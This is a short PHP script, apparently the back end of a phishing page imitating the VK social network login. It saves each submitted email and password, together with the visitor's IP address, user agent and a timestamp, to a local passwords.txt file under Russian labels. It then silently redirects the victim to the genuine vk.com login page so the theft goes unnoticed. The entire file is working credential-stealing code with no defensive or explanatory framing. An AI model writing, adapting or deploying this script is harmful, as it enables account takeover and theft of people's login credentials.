<?PHP
date_default_timezone_set('Europe/Kiev');
$Data = date('l jS \of F Y H:i:s A');
$Ip = $_SERVER['REMOTE_ADDR'];
$Name = $_SERVER['HTTP_HOST'];
$Agent = $_SERVER['HTTP_USER_AGENT'];
$Log = $_POST['email'];
$Pass = $_POST['pass'];
$log = fopen("passwords.txt","at");
fwrite($log,"ДАТА:$Data\nIP:$Ip\nИмя:$Name\nДанные:$Agent\nВведенный логин:$Log\nВведенный пароль:$Pass \n\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/login.php?m=1&email=$Log'></head></html>";
?>